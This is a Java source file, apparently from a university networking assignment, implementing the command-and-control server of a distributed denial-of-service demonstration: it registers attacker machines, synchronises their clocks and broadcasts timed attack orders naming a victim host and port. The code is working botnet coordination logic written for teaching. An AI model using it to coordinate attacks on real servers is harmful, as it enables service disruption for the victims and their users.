package eecs3214a2;

import eecs3214a2.common.*;
import java.io.*;
import java.net.*;
import java.util.*;

/**
 * Command and control server in the
 * Distributed Denial Of Service
 * attack demonstration.
 *
 * @author Vincent Chu
 * @version 1.0
 */
public class CmdCtrl extends CommandLine implements Closeable {

    private static final Log L = Log.get();

    /**
     * Server for subscribing and un-subscribing attackers.
     * Client for broadcasting time sync and attack instructions
     * Set of attackers
     */
    private ServerService ccServer;
    private final Set<InetSocketAddress> attackers = new HashSet<>();

    public CmdCtrl() {
        add("start", "listen(int)", "port",
                "Starts the server and listens to registration from " +
                "attackers at the given 'port' number.");
        add("stop", "close", "",
                "Stops the registrar server.");
        add("attack", "issueAttack(String, int, String, long)",
                "host port start duration",
                "Broadcasts an attack instruction to all the attackers, " +
                "given the 'host' name and 'port' number of the victim " +
                "server, the attack 'start' date and time in ISO 8601 " +
                "format and the attack 'duration' in seconds.");
        add("list", "listAttackers()", "",
                "Prints all the registered attackers.");
        add("sync", "syncClocks()", "",
                "Broadcasts an instruction to synchronize all " +
                "of the attackers' clocks.");
    }

    /**
     * Start listen to registration from attackers.
     *
     * @param port
     *      the port number of registrar
     * @throws IOException
     *      cannot acquire port
     */
    public void listen(Integer port) throws IOException {
        if (ccServer != null && !ccServer.isClosed()) {
            throw new IllegalStateException("Server already listening");
        }
        ccServer = new ServerService();
        ccServer.listen(RegistrarAgent.class, port, this);
    }

    /**
     * List the set of attackers registered to listen to
     * the command-and-control server.
     */
    public void listAttackers() {
        synchronized (attackers) {
            for (InetSocketAddress address : attackers) {
                System.out.printf("Attacker %s:%d%n",
                        address.getHostName(),
                        address.getPort());
            }
        }
    }

    /**
     * Adds the given host and port to the
     * set of attackers registered to listen to
     * the command-and-control server.
     *
     * @param host
     *      the attacker host name
     * @param port
     *      the attacker port number
     */
    public void subscribe(String host, Integer port) {
        synchronized (attackers) {
            attackers.add(new InetSocketAddress(host, port));
        }
    }

    /**
     * Removes the given host and port from the
     * set attackers registered to listen to
     * the command-and-control server.
     *
     * @param host
     *      the attacker host name
     * @param port
     *      the attacker port number
     */
    public synchronized void cancel(String host, Integer port) {
        InetSocketAddress address = new InetSocketAddress(host, port);
        synchronized (attackers) {
            if (attackers.contains(address)) {
                attackers.remove(new InetSocketAddress(host, port));
            }
        }
    }

    /**
     * Broadcast an attack instruction to the attackers.
     *
     * @param host
     *      the victim host name
     * @param port
     *      the victim port number
     * @param dateTime
     *      the attack start date and time
     * @param duration
     *      the attack duration in seconds
     */
    public void issueAttack(String host, Integer port, String dateTime, Long duration) {
        for (InetSocketAddress address : attackers) {
            ErrorHandle errHandle = new AttackerCleanupErrorHandle(address);
            ClientService.send(address.getHostName(), address.getPort(), errHandle,
                    "ATTACK %s %d %s %d", host, port, dateTime, duration);
        }
    }

    /**
     * Broadcast an instruction to synchronize the
     * attackers' clocks.
     */
    public void syncClocks() {
        for (InetSocketAddress address : attackers) {
            ErrorHandle errHandle = new AttackerCleanupErrorHandle(address);
            ClientService.send(address.getHostName(), address.getPort(), errHandle,
                    "SYNC %d", System.currentTimeMillis());
        }
    }

    @Override
    public void close() throws IOException {
        if (ccServer == null || ccServer.isClosed()) {
            throw new IllegalStateException("Server closed already");
        }
        ccServer.close();
        synchronized (attackers) {
            attackers.clear();
        }
    }

    // Subclasses

    /**
     * Agent that implements a server handler
     * that listens for new machines to subscribe
     * to the broadcasting messages, or machines to
     * un-subscribe from the broadcast.
     */
    public class RegistrarAgent implements Agent {
        @Override
        public boolean doAction(Map<String, Object> ctx, String msg, PrintWriter out) throws IOException {
            if (msg == null) { return true; }
            CommandExecutor exec = (CommandExecutor)ctx.get("protocol");
            if (exec == null) {
                ctx.put("protocol", exec = new CommandExecutor()
                        .add("subscribe", "subscribe(String, int)")
                        .add("cancel", "cancel(String, int)"));
            }
            exec.execute(CmdCtrl.this, msg);
            return false;
        }
    } // RegistrarAgent

    /**
     * Simple error handler to clean up
     * old and inaccessible attackers.
     */
    class AttackerCleanupErrorHandle extends ClientService.SimpleClientErrorHandle {
        InetSocketAddress address;
        AttackerCleanupErrorHandle(InetSocketAddress address) {
            this.address = address;
        }
        @Override
        public void doError(Throwable e) {
            super.doError(e);
            synchronized (attackers) {
                attackers.remove(address);
            }
        }
    } // AttackerCleanupErrorHandle

    // For Testing Purposes Only

    public static void main(String ...args) throws IOException {
        (new CmdCtrl()).run();
    }

} // CmdCtrl
